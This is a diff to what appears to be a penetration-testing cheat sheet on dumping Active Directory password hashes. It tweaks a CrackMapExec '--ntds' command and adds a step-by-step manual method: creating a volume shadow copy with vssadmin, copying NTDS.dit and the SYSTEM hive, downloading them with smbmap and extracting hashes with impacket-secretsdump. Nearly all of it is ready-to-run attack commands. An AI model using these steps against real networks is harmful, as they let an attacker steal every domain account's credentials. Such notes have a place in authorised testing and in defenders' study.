@@ -181,8 +181,25 @@ sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds
 
 # CrackMapExec using kerberos ticket
 export KRB5CCNAME=<user>.ccache 
-sudo crackmapexec smb <target> --kerberos --ntds
+sudo crackmapexec smb <target> --kerberos --ntds drsuapi
 
 # Antivirus blocking default drsuapi method, try vss method instead
 sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds vss
 ```
+
+### Manual Dump
+
+```bash
+# 1) use any tool that can achieve command execution on remote target to make a shadow copy
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\NTDS.dit.bak
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\SYSTEM.bak
+
+# 2) use any tool that can retrieve these 2 files 
+smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\NTDS.dit.bak'
+smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SYSTEM.bak'
+
+# 3) Locally parse theses files
+impacket-secretsdump -ntds NTDS.dit.bak -system SYSTEM.bak LOCAL
+```
+
